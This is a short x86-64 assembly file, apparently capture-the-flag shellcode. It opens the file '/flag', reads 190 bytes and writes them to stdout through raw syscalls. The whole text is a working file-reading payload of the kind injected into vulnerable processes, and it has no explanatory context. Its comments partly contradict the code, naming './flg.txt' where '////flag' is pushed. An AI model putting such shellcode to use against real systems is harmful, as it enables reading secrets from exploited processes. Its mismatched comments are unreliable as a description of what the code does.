global _start

section .text
_start:
    ; push './flg.txt\x00'
    xor rdi, rdi
    push rdi              ; push NULL string terminator
    mov rdi, '////flag' ; rest of file name
    push rdi            ; push to stack 
    
    ; open('rsp', 'O_RDONLY')
    mov al, 2          ; open syscall number
    mov rdi, rsp        ; move pointer to filename
    xor rsi, rsi        ; set O_RDONLY flag
    syscall

    ; read file
    lea rsi, [rdi]      ; pointer to opened file
    mov rdi, rax        ; set fd to rax from open syscall
    xor rax, rax        ; read syscall number
    mov dl, 190         ; size to read
    syscall

    ; write output
    mov al, 1          ; write syscall
    mov dil, 1          ; set fd to stdout
    mov dl, 190         ; size to read
    syscall

    ; exit
    mov eax, 60
    xor rdi, rdi
    syscall

